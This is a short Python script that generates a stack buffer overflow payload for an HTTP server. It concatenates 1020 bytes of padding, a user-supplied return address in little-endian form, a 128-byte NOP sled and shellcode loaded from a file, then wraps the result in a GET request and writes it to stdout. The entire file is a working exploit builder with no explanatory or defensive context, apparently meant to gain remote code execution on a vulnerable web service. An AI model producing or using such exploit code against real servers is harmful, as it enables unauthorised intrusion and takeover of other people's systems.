#!/usr/bin/env python3

import sys

def to_little_endian(addr_str):
    addr = int(addr_str, 16)
    return addr.to_bytes(4, byteorder='little')

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <jump_addr> <shellcode_file>", file=sys.stderr)
        sys.exit(1)

    jump_addr = to_little_endian(sys.argv[1])
    shellcode_file = sys.argv[2]

    # Adjust these based on testing
    offset = 1020
    nop_sled_size = 128

    padding = b"A" * offset
    nop_sled = b"\x90" * nop_sled_size

    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    payload = padding + jump_addr + nop_sled + shellcode

    # Wrap into a valid HTTP GET request
    request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"

    sys.stdout.buffer.write(request)

if __name__ == "__main__":
    main()

